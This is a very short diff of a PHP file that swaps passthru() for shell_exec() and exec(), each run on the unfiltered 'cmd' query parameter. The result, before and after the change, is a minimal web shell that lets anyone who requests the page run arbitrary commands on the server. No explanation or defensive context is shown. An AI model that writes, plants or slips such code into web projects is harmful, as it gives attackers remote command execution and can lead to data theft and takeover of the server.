@@ -1,3 +1,4 @@
 <?php
-passthru($_GET['cmd']);
+shell_exec($_GET['cmd']);
+exec($_GET['cmd']);
 ?>
